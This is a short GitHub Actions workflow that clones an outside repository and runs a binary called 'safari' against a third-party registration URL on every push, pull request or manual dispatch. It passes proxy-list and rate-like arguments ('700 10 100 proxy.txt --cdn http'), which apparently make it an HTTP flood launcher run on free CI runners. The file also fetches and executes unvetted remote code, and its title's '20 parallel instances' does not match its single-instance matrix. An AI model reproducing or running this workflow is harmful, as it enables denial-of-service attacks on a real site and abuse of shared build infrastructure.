name: Run Script (20 Parallel Instances)

on:
  push:
    branches: [ main, master ]
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  run-script:
    runs-on: ubuntu-24.04
    strategy:
      fail-fast: false
      matrix:
        instance: [1]
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Convert line endings and run safari (Instance ${{ matrix.instance }})
      run: |
        git clone https://github.com/Kiwiwjkwi/cuddly-octo-bassoon.git
        cd cuddly-octo-bassoon
        chmod +x safari
        ./safari  https://xbossop.shop/register   700 10 100 proxy.txt --cdn http 
    
